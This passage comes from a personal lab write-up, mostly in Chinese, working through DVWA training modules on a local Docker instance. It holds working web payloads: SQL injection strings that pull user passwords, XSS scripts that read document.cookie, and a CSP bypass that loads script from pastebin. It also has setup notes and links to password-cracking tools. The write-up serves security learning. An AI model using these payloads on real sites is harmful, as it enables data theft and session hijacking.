    0' UNION SELECT 1,(IF (SUBSTRING((SELECT @@version),1,2) = '00', TRUE, FALSE))
    
    ```
    
    ```bash
    0' UNION SELECT (IF (SUBSTRING((SELECT @@version),1,2) = '10', TRUE, FALSE))
    
    ```
    
    ```bash
    0' OR SUBSTRING((SELECT @@version),1,2) = '10'
    ```
    
    ```bash
    0' UNION SELECT user_id,password from users WHERE user_id = '0
    ```
    

---

# 9. Weak Session IDs

### Objective: This module uses four different ways to set the dvwaSession cookie value, the objective of each level is to work out how the ID is 
generated and then infer the IDs of other system users.

### 觀察

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2092.png)

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2093.png)

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2094.png)

可以很明顯地看出 dvwaSession 是遞增的

---

# 10. DOM Based Cross Site Scripting (XSS)

### Objective: Run your own JavaScript in another user's browser, use this to steal the cookie of a logged in user.

### 觀察

可以直接從 URL 塞入任意字串，頁面回傳後直接 render 在表單內，代表我們可以試著塞入 javascript 看看

```html
http://localhost:8086/vulnerabilities/xss_d/?default=English123
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2095.png)

```html
http://localhost:8086/vulnerabilities/xss_d/?default=English<script>alert(1)</script>
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2096.png)

### ✨Done✨

```html
http://localhost:8086/vulnerabilities/xss_d/?default=English<script>alert(document.cookie)</script>
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2097.png)

### Ref

### Types of XSS

Types of XSS | OWASP Foundation
[https://owasp.org/www-community/Types_of_Cross-Site_Scripting#DOM_Based_XSS_.28AKA_Type-0.29](https://owasp.org/www-community/Types_of_Cross-Site_Scripting#DOM_Based_XSS_.28AKA_Type-0.29)

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2098.png)

---

# 11. Reflected Cross Site Scripting (XSS)

## 觀察

可以直接從 input box 輸入也可以從 URL bar 輸入 malicious script

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2099.png)

### ✨Done✨

```html
<script>console.log(document.cookie)</script>
```

```html
localhost:8086/vulnerabilities/xss_r/?name=<script>console.log(document.cookie)</script>
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20100.png)

---

# 12. Stored Cross Site Scripting (XSS)

```html
<script>alert(document.cookie)</script>
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20101.png)

### ✨Done✨

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20102.png)

---

# 13. Content Security Policy (CSP) Bypass

### Bypass Content Security Policy (CSP) and execute JavaScript in the page.

> The Content-Security-Policy header allows you to restrict how resources such as JavaScript, CSS, or pretty much anything that the browser loads.
> 

> Although it is primarily used as a HTTP response header, you can also apply it via a [meta tag](https://content-security-policy.com/examples/meta/).
> 

## 觀察 CSP 設定

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20103.png)

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20104.png)

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20105.png)

### script-src

可以看出這些來源的 script 是可以被接受的，所以任何從以下來載入的 script 都可以被執行

```html
Content-Security-Policy: script-src 'self' https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;
```

### 試著載入來自 pastebin 的 js file

```html
https://pastebin.com/assets/9ce1885/jquery.min.js
```

原本頁面沒有 jQuery

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20106.png)

載入來自 [https://pastebin.com/](https://pastebin.com/) 的 jquery file

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20107.png)

### ✨Done✨

檢查後發現可以使用 jQuery 的 function 代表有成功載入

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20108.png)

來試試看其他的

```html
https://pastebin.com/embed/sa4JzpAP
```

即使不是 .js file 好像也可以被執行

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20109.png)

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20110.png)

### 心得

直得留意的是，本機的 DVWA 是沒有 HTTPS 的，而載入的來源都已經強制使用或自動跳轉成 HTTPS

---

# 14. JavaScript Attacks

看起來是要我們送出 success 這個字串，但送出後卻得到 `Invalid token.`

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20111.png)

## 觀察

### 查看表單細節

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20112.png)

### 檢查送出前 javascript 有做哪些處理

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20113.png)

```jsx
/*
MD5 code from here
https://github.com/blueimp/JavaScript-MD5
*/

...

function rot13(inp) {
		return inp.replace(/[a-zA-Z]/g,function(c){return String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);});
	}

	function generate_token() {
		var phrase = document.getElementById("phrase").value;
		document.getElementById("token").value = md5(rot13(phrase));
	}

	generate_token();
```

可以發現在頁面載入時． `generate_token()` 這個 function 會被執行一次，它將 `#phrase` 的 value 餵給 md5 和 rot13，產生一組 token，此時 `phrase` 是預設的 `ChangeMe` ，因此不論你送出什麼，都會得到 invalid token 這樣的回傳訊息，因為 token 是由 `ChangeMe` 這個字串的值運算而來 也就是`8b479aefbd90795395b3e7089ae0dc09`．

因此簡單的解法就是在 input 填入 `success` 後，於 console 再執行一次，這樣 token 的值就會改變成**`38581812b435834ebf84ebcc2c6424d6`** 

手動在 console 執行 `generate_token()` 一次，再送出表單

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20115.png)

### ✨Done✨

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20116.png)

## memo

### 測試 `generate_token()`

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20117.png)

```jsx
md5(rot13('ChangeMe')) // "8b479aefbd90795395b3e7089ae0dc09"
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20118.png)

```jsx
md5(rot13('success')) // "**38581812b435834ebf84ebcc2c6424d6"**
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20119.png)

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20120.png)

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20121.png)

```html
token=38581812b435834ebf84ebcc2c6424d6&phrase=success&send=Submit
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20122.png)

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20123.png)

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20124.png)

---

# Ref

## run DVWA with container

opsxcq/docker-vulnerable-dvwa: Damn Vulnerable Web Application Docker container
[https://github.com/opsxcq/docker-vulnerable-dvwa](https://github.com/opsxcq/docker-vulnerable-dvwa)

```markdown
docker run --rm -it -p 8086:80 vulnerables/web-dvwa
```

or

```markdown
docker run -d -p 8086:80 vulnerables/web-dvwa
```

```markdown
go to http://localhost:8086
```

```markdown
To login you can use the following credentials:

    Username: admin
    Password: password
```

帳密用 dev:dev  也能登入 @@

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20125.png)

```markdown
http://localhost:8086/instructions.php?doc=readme
```

DVWA 說明頁面裡面也有些文件可以參考，有附贈 Guide，包括了 OWASP10 和難度說明

[DVWA_v1.3.pdf](DVWA%2018a0425eb14f4c03822e8c563383e612/DVWA_v1.3.pdf)

首頁 - OWASP Top 10:2021
[https://owasp.org/Top10/zh_TW/](https://owasp.org/Top10/zh_TW/)

DVWA - Damn Vulnerable Web Application
[https://dvwa.co.uk/](https://dvwa.co.uk/)

digininja/DVWA: Damn Vulnerable Web Application (DVWA)
[https://github.com/digininja/DVWA](https://github.com/digininja/DVWA)

## Enable PHP modules

### Editing php.ini

### 1. 直接進入 container 內修改

docker-vulnerable-dvwa/Dockerfile at master · opsxcq/docker-vulnerable-dvwa
[https://github.com/opsxcq/docker-vulnerable-dvwa/blob/master/Dockerfile](https://github.com/opsxcq/docker-vulnerable-dvwa/blob/master/Dockerfile)

Repo 裡有寫 PHP5 的設定，但是沒有 for PHP7 的，PHP7 的設定檔在 `/etc/php/7.0/apache2/php.ini` ，看起來是已經安裝在環境裡，如果要自己 build，就要另外改 Dockerfile，將自己的 PHP7 config 複製進去

```html
...
COPY php.ini /etc/php5/apache2/php.ini
...
```

```bash
docker exec -it app-training-dvwa /bin/bash
apt update -y && apt install vim -y
vim /etc/php/7.0/apache2/php.ini
service apache2 restart
```

### 2. 或自行 build image

```html
git clone https://github.com/opsxcq/docker-vulnerable-dvwa.git
cd docker-vulnerable-dvwa
# prepare your own php.ini
docker build .
```

## Hydra

### password list

SecLists/Passwords/Common-Credentials at master · danielmiessler/SecLists
[https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials)

Hydra-Cheatsheet/Hydra-Password-Cracking-Cheatsheet.pdf at master · frizb/Hydra-Cheatsheet
[https://github.com/frizb/Hydra-Cheatsheet/blob/master/Hydra-Password-Cracking-Cheatsheet.pdf](https://github.com/frizb/Hydra-Cheatsheet/blob/master/Hydra-Password-Cracking-Cheatsheet.pdf)

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20126.png)

### Medusa

Brute Force Password Cracking with Medusa | by SheHacks_KE | Medium
[https://shehackske.medium.com/brute-force-password-cracking-with-medusa-b680b4f33d69](https://shehackske.medium.com/brute-force-password-cracking-with-medusa-b680b4f33d69)
jmk-foofus/medusa: Medusa is a speedy, parallel, and modular, login brute-forcer.
[https://github.com/jmk-foofus/medusa](https://github.com/jmk-foofus/medusa)

## write-ups

ctf-writeups/dvwa-low.md at master · mzet-/ctf-writeups
[https://github.com/mzet-/ctf-writeups/blob/master/DVWA/dvwa-low.md](https://github.com/mzet-/ctf-writeups/blob/master/DVWA/dvwa-low.md)

## *reCAPTCHA API key missing*

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20127.png)

### 取得 *reCAPTCHA v2* public & private key

[https://www.google.com/recaptcha/admin/create](https://www.google.com/recaptcha/admin/create)

註冊網域:

```jsx
localhost
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20128.png)

edit `/var/www/html/config/config.inc.php`

```jsx
vim /var/www/html/config/config.inc.php
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20129.png)

### 不支援 [localhost](http://localhost) 了，因此可以用 .local or 自己定義其他 alias 取代 localhost

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20130.png)

### edit hosts file

```
127.0.0.1 dvwa.localtest
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20131.png)

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%20132.png)

---

### Other links

Web Security Testing Cookbook
[https://learning.oreilly.com/library/view/web-security-testing/9780596514839/](https://learning.oreilly.com/library/view/web-security-testing/9780596514839/)

MySQL SQL Injection Cheat Sheet | pentestmonkey
[https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)

我們與 OSCP 的距離
[https://tech-blog.cymetrics.io/posts/crystal/oscp-review/](https://tech-blog.cymetrics.io/posts/crystal/oscp-review/)

資安這條路 04 - [Injection] SQL injection - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天
[https://ithelp.ithome.com.tw/articles/10240102](https://ithelp.ithome.com.tw/articles/10240102)
[Day30] Pentesting CheatSheet Meow Meow - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天
[https://ithelp.ithome.com.tw/articles/10281813](https://ithelp.ithome.com.tw/articles/10281813)

從 PicoCTF 中跨領域學資訊安全 :: 2021 iThome 鐵人賽
[https://ithelp.ithome.com.tw/users/20134305/ironman/4222](https://ithelp.ithome.com.tw/users/20134305/ironman/4222)

SQL Tutorial
[https://www.w3schools.com/sql/default.asp](https://www.w3schools.com/sql/default.asp)
SQL Server IF ELSE Statement By Examples
[https://www.sqlservertutorial.net/sql-server-stored-procedures/sql-server-if-else/](https://www.sqlservertutorial.net/sql-server-stored-procedures/sql-server-if-else/)
Oracle基本修練: PL/SQL if-else, case statements | by ChunJen Wang | jimmy-wang | Medium
[https://medium.com/jimmy-wang/oracle基本修練-pl-sql-if-else-case-statements-5399d6631307](https://medium.com/jimmy-wang/oracle%E5%9F%BA%E6%9C%AC%E4%BF%AE%E7%B7%B4-pl-sql-if-else-case-statements-5399d6631307)

OWASP Top Ten Web Application Security Risks | OWASP
[https://owasp.org/www-project-top-ten/](https://owasp.org/www-project-top-ten/)
網路安全-靶機dvwa之sql注入Low到High詳解（含程式碼分析）_osc_0qnrwmy3 - MdEditor
[https://www.gushiciku.cn/pl/pFNg/zh-tw](https://www.gushiciku.cn/pl/pFNg/zh-tw)

Types of XSS | OWASP Foundation
[https://owasp.org/www-community/Types_of_Cross-Site_Scripting#DOM_Based_XSS_.28AKA_Type-0.29](https://owasp.org/www-community/Types_of_Cross-Site_Scripting#DOM_Based_XSS_.28AKA_Type-0.29)

SQL Server IF ELSE Statement By Examples
[https://www.sqlservertutorial.net/sql-server-stored-procedures/sql-server-if-else/](https://www.sqlservertutorial.net/sql-server-stored-procedures/sql-server-if-else/)
Oracle基本修練: PL/SQL if-else, case statements | by ChunJen Wang | jimmy-wang | Medium
[https://medium.com/jimmy-wang/oracle基本修練-pl-sql-if-else-case-statements-5399d6631307](https://medium.com/jimmy-wang/oracle%E5%9F%BA%E6%9C%AC%E4%BF%AE%E7%B7%B4-pl-sql-if-else-case-statements-5399d6631307)

Flexible Database Schema + Hybrid Data Model | JSON
[https://mariadb.com/database-topics/semi-structured-data/](https://mariadb.com/database-topics/semi-structured-data/)

Birds of a Feather 2017: 邀請分享 Light Up The Korean DarkWeb - Dasom Kim
[https://www.slideshare.net/HITCONGIRLS/birds-of-a-feather-2017-light-up-the-korean-darkweb-dasom-kim](https://www.slideshare.net/HITCONGIRLS/birds-of-a-feather-2017-light-up-the-korean-darkweb-dasom-kim)
The Malware Museum : Free Software : Free Download, Borrow and Streaming : Internet Archive
[https://archive.org/details/malwaremuseum](https://archive.org/details/malwaremuseum)
